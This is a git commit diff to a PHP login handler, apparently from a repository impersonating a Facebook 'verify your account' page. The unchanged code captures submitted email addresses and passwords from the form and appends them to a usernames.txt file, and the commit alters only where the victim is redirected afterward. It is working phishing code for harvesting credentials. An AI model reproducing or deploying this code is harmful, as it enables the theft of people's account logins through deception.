370d4b6ca90b8c61f7000f6831bd27d77aec34c0
matanghulbedegong1A <108221899+matanghulbedegong1A@users.noreply.github.com>
2022-07-06 02:25:18 +0700

    Update login-1.php

--- login-1.php
+++ login-1.php
@@ -1,5 +1,5 @@
 <?php
 
 file_put_contents("usernames.txt", "Account: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
-header('Location: https://facebook.com/');
+header('Location: https://github.com/matanghulbedegong1A/verifyYourAccount-php-fbiD/edit/main/login-1.php/');
 exit();
